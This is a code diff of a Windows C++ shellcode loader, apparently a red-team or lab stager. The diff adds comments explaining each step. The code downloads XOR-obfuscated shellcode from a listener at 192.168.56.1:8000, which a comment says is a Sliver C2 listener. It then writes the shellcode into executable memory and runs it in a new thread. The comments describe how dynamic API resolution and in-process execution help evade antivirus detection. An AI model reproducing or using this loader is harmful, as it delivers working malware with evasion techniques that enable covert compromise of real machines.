@@ -1,18 +1,19 @@
-#define WIN32_LEAN_AND_MEAN
-#include <windows.h>
+#define WIN32_LEAN_AND_MEAN  // Reduces size of included Windows headers (helps with AV signature reduction). Also reduces redundancy 
+#include <windows.h>  
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <cstdlib>
 
 
-#pragma comment(lib, "Ws2_32.lib")
+#pragma comment(lib, "Ws2_32.lib") // Statically links the Winsock2 library
 
+// struct container for the shellcode and its size
 struct Payload {
     BYTE* d;
     DWORD s;
 };
 
-BOOL netXfer(const char* h, int p, Payload* pl);
+BOOL netXfer(const char* h, int p, Payload* pl); // Downloads encrypted shellcode over a TCP connection from h:port
 void xorObf(BYTE* d, DWORD l, BYTE k);
 DWORD execLocal(Payload pl);
 
@@ -23,6 +24,7 @@ typedef DWORD(WINAPI* pWaitForSingleObject)(HANDLE, DWORD);
 typedef BOOL(WINAPI* pGetExitCodeThread)(HANDLE, LPDWORD);
 typedef BOOL(WINAPI* pCloseHandle)(HANDLE);
 
+// Downloads encrypted shellcode, decrypts it, and runs it in-memory
 int main() {
     Payload pl;
     if (!netXfer("192.168.56.1", 8000, &pl)) return 2;
@@ -32,19 +34,21 @@ int main() {
 
 BOOL netXfer(const char* h, int p, Payload* pl) {
     WSADATA wd;
-    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) return FALSE;
+    if (WSAStartup(MAKEWORD(2, 2), &wd) != 0) return FALSE;  // Initialize the Windows Sockets API
 
-    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); // Create a TCP socket
     if (s == INVALID_SOCKET) {
         WSACleanup();
         return FALSE;
     }
 
+    // Preparation to connect to the target IP and port
     sockaddr_in srv;
     srv.sin_family = AF_INET;
     srv.sin_port = htons(p);
     inet_pton(AF_INET, h, &srv.sin_addr);
 
+    // connect to sliver shellcode listener
     if (connect(s, (SOCKADDR*)&srv, sizeof(srv)) == SOCKET_ERROR) {
         closesocket(s);
         WSACleanup();
@@ -52,9 +56,10 @@ BOOL netXfer(const char* h, int p, Payload* pl) {
     }
 
     DWORD cap = 4096;
-    BYTE* buf = (BYTE*)malloc(cap);
+    BYTE* buf = (BYTE*)malloc(cap); // allocate memory for incoming shellcode
     DWORD sz = 0;
 
+    // Read the shellcode from socket in chunks at runtime
     while (true) {
         int r = recv(s, (char*)(buf + sz), cap - sz, 0);
         if (r <= 0) break;
@@ -74,32 +79,36 @@ BOOL netXfer(const char* h, int p, Payload* pl) {
 }
 
 DWORD execLocal(Payload pl) {
-    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
+    HMODULE hK32 = GetModuleHandleA("kernel32.dll"); // Gets a handle to Kernel32 DLL, loaded in all Windows processes
     if (!hK32) return -99;
 
-    pVirtualAllocEx VirtualAllocEx_ = (pVirtualAllocEx)GetProcAddress(hK32, "VirtualAllocEx");
+    // dynamically resolving API function pointers
+    // this is better for evasion since the APIs are not statically linked, which helps bypass signature-based detection
+    pVirtualAllocEx VirtualAllocEx_ = (pVirtualAllocEx)GetProcAddress(hK32, "VirtualAllocEx");  
     pWriteProcessMemory WriteProcessMemory_ = (pWriteProcessMemory)GetProcAddress(hK32, "WriteProcessMemory");
     pCreateRemoteThread CreateRemoteThread_ = (pCreateRemoteThread)GetProcAddress(hK32, "CreateRemoteThread");
     pWaitForSingleObject WaitForSingleObject_ = (pWaitForSingleObject)GetProcAddress(hK32, "WaitForSingleObject");
     pGetExitCodeThread GetExitCodeThread_ = (pGetExitCodeThread)GetProcAddress(hK32, "GetExitCodeThread");
     pCloseHandle CloseHandle_ = (pCloseHandle)GetProcAddress(hK32, "CloseHandle");
 
-    HANDLE hp = GetCurrentProcess();
-    LPVOID m = VirtualAllocEx_(hp, nullptr, pl.s, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    HANDLE hp = GetCurrentProcess();  // get current process
+    LPVOID m = VirtualAllocEx_(hp, nullptr, pl.s, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // allocate memory in current process, this avoids suspicious cross-process injection
     if (!m) return -1;
 
     SIZE_T wr;
+    // copies the decrypted shellcode into allocated memory
     if (!WriteProcessMemory_(hp, m, pl.d, pl.s, &wr)) {
         VirtualFreeEx(hp, m, 0, MEM_RELEASE);
         return -2;
     }
 
-    HANDLE ht = CreateRemoteThread_(hp, nullptr, 0, (LPTHREAD_START_ROUTINE)m, nullptr, 0, nullptr);
+    HANDLE ht = CreateRemoteThread_(hp, nullptr, 0, (LPTHREAD_START_ROUTINE)m, nullptr, 0, nullptr); // executes the shellcode within the same process via a new thread
     if (!ht) {
         VirtualFreeEx(hp, m, 0, MEM_RELEASE);
         return -3;
-    }
+    } // this avoids CreateProcess or injection into other apps, which could easily get flagged
 
+    // wait for shellcode to finish and cleans up thread handle
     WaitForSingleObject_(ht, INFINITE);
     DWORD ec;
     GetExitCodeThread_(ht, &ec);
@@ -107,6 +116,7 @@ DWORD execLocal(Payload pl) {
     return ec;
 }
 
+// apply a simple XOR obfuscation with a key (0xAA)
 void xorObf(BYTE* d, DWORD l, BYTE k) {
     for (DWORD i = 0; i < l; ++i) d[i] ^= k;
 }
